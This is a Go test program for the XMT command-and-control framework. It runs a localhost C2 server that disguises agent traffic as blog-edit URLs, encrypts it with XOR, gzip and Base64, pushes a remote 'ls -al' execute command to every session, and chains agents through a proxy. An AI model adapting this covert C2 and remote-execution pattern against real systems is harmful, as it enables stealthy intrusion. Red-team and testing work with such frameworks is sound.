package main

import (
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/iDigitalFlame/logx/logx"
	"github.com/iDigitalFlame/xmt/xmt/c2"
	"github.com/iDigitalFlame/xmt/xmt/c2/transform"
	"github.com/iDigitalFlame/xmt/xmt/c2/wrapper"
	"github.com/iDigitalFlame/xmt/xmt/com/tcp"
	"github.com/iDigitalFlame/xmt/xmt/com/web"
	"github.com/iDigitalFlame/xmt/xmt/crypto/xor"
	"github.com/iDigitalFlame/xmt/xmt/util"
)

func main() {
	testWebC2()
}

func testWebC2() {
	c2.Controller.Log = logx.NewConsole(logx.LTrace)

	u := &web.Generator{
		URL:  util.Matcher("/post/%31d/%12d/%31d/edit/%4fl"),
		Host: util.Matcher("%6fl.myblogsite.com"),
	}

	g, _ := wrapper.NewGzip(7)
	x, _ := wrapper.NewCrypto(
		xor.Cipher("this is a key"),
		xor.Cipher("this is a key"),
	)

	p := &c2.Profile{
		Sleep:     time.Duration(5) * time.Second,
		Wrapper:   wrapper.NewMulti(x, g),
		Transform: transform.Base64,
	}

	if len(os.Args) != 2 {
		os.Exit(1)
	}

	c2.PacketMultiMaxSize = 1024

	switch os.Args[1] {
	case "s":
		w := web.New(p.Sleep)
		w.Handle("/", http.FileServer(http.Dir("/tmp/")))
		w.Rule(&web.Rule{
			URL:  u.URL.(util.Matcher).Match(),
			Host: u.Host.(util.Matcher).Match(),
		})

		c, err := c2.Controller.Listen("http", "127.0.0.1:8080", w, p)
		if err != nil {
			panic(err)
		}
		c.Register = func(s *c2.Session) {
			fmt.Printf("registered! %s\n", s.ID)
			s.Time(10*time.Second, 0)
		}

		time.Sleep(30 * time.Second)

		for _, v := range c.Sessions() {
			v.WritePacket(c2.Execute.New("ls", "-al"))
		}

	case "c":
		i, err := c2.Controller.Connect("http://127.0.0.1:8080", &web.Client{Generator: u}, p)
		if err != nil {
			panic(err)
		}
		_, err = i.Proxy("localhost:9090", tcp.Raw, &c2.Profile{Transform: transform.DNS})
		if err != nil {
			panic(err)
		}
	case "p":
		_, err := c2.Controller.Connect("localhost:9090", tcp.Raw, &c2.Profile{
			Sleep:     3 * time.Second,
			Transform: transform.DNS,
		})
		if err != nil {
			panic(err)
		}
	}

	c2.Controller.Wait()
}
